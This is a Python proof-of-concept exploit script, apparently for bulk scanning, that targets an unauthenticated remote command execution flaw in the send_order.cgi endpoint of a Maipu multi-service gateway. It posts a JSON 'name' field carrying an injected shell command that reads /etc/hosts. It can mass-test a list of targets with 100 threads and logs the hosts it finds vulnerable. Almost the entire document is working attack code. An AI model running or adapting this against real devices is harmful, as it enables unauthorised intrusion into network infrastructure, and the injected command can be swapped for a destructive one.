#迈普 多业务融合网关 send_order.cgi 前台RCE漏洞复现

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    banner = '''

   ▄████████ ████████▄    ▄█             ▄█  ███▄▄▄▄        ▄█    ▄████████  ▄████████     ███      ▄█   ▄██████▄  ███▄▄▄▄   
  ███    ███ ███    ███  ███            ███  ███▀▀▀██▄     ███   ███    ███ ███    ███ ▀█████████▄ ███  ███    ███ ███▀▀▀██▄ 
  ███    █▀  ███    ███  ███            ███▌ ███   ███     ███   ███    █▀  ███    █▀     ▀███▀▀██ ███▌ ███    ███ ███   ███ 
  ███        ███    ███  ███            ███▌ ███   ███     ███  ▄███▄▄▄     ███            ███   ▀ ███▌ ███    ███ ███   ███ 
▀███████████ ███    ███  ███            ███▌ ███   ███     ███ ▀▀███▀▀▀     ███            ███     ███▌ ███    ███ ███   ███ 
         ███ ███    ███  ███            ███  ███   ███     ███   ███    █▄  ███    █▄      ███     ███  ███    ███ ███   ███ 
   ▄█    ███ ███  ▀ ███  ███▌    ▄      ███  ███   ███     ███   ███    ███ ███    ███     ███     ███  ███    ███ ███   ███ 
 ▄████████▀   ▀██████▀▄█ █████▄▄██      █▀    ▀█   █▀  █▄ ▄███   ██████████ ████████▀     ▄████▀   █▀    ▀██████▀   ▀█   █▀  
                         ▀                             ▀▀▀▀▀▀                                                                
                                                                    info:迈普 多业务融合网关 send_order.cgi 前台RCE漏洞
                                                                    version:1.0 author:YeahSir  
'''
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="迈普 多业务融合网关 send_order.cgi 前台RCE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/send_order.cgi?parameter=operation'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", 
        "Content-Type": "application/x-www-form-urlencoded"}
    json={"name": ";echo -n klmns:;cat /etc/hosts;", "opid": "1", "type": "rest"}
    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
    }

    try:
        response = requests.post(url=url,headers=headers,json=json,proxies=proxies,timeout=5,verify=False)
        print(response.headers)
        if response.status_code == 200 and 'ok' in response.text and 'klmns' in response.headers:
            print( f"{GREEN}[+] {target} 存在RCE漏洞！{RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")

if __name__ == '__main__':
    main()